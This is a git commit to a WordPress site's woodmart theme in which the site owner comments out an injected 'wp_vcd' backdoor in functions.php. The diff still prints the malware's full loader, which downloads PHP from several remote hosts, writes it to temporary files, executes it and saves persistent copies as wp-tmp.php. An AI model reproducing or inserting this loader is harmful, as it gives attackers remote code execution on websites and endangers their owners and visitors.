402ebe3d7358b1f65807eadc7132f1f9069b154c
rabadanov <145@armed.ru>
2018-02-27 15:54:18 +0300

    fix2

--- wp-content/db.php
+++
@@ -1,1 +0,0 @@
-/home/u481580/wp.armed.ru/www/wp-content/plugins/query-monitor/wp-content/db.php
--- wp-content/themes/woodmart/functions.php
+++ wp-content/themes/woodmart/functions.php
@@ -67,97 +67,97 @@ $div_code_name="wp_vcd";
 
 
 
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+// $div_code_name = "wp_vcd";
+// $funcfile      = __FILE__;
+// if(!function_exists('theme_temp_setup')) {
+    // $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    // if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
         
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
+        // function file_get_contents_tcurl($url)
+        // {
+            // $ch = curl_init();
+            // curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            // curl_setopt($ch, CURLOPT_HEADER, 0);
+            // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            // curl_setopt($ch, CURLOPT_URL, $url);
+            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            // $data = curl_exec($ch);
+            // curl_close($ch);
+            // return $data;
+        // }
         
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
+        // function theme_temp_setup($phpCode)
+        // {
+            // $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            // $handle   = fopen($tmpfname, "w+");
+           // if( fwrite($handle, "<?php\n" . $phpCode))
+		   // {
+		   // }
+			// else
+			// {
+			// $tmpfname = tempnam('./', "theme_temp_setup");
+            // $handle   = fopen($tmpfname, "w+");
+			// fwrite($handle, "<?php\n" . $phpCode);
+			// }
+			// fclose($handle);
+            // include $tmpfname;
+            // unlink($tmpfname);
+            // return get_defined_vars();
+        // }
         
 
-$wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
-        if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+// $wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
+        // if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+            // if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                // extract(theme_temp_setup($tmpcontent));
+                // @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                 
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
+                // if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    // @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    // if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        // @file_put_contents('wp-tmp.php', $tmpcontent);
+                    // }
+                // }
                 
-            }
-        }
+            // }
+        // }
         
         
-        elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+        // elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+// if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                // extract(theme_temp_setup($tmpcontent));
+                // @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                 
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
+                // if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    // @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    // if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        // @file_put_contents('wp-tmp.php', $tmpcontent);
+                    // }
+                // }
                 
-            }
-        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
+            // }
+        // } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            // extract(theme_temp_setup($tmpcontent));
            
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+        // } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            // extract(theme_temp_setup($tmpcontent)); 
 
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+        // } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            // extract(theme_temp_setup($tmpcontent)); 
 
-        } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+        // } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            // extract(theme_temp_setup($tmpcontent)); 
 
-        }
+        // }
         
         
         
         
         
-    }
-}
+    // }
+// }
 
 //$start_wp_theme_tmp
 
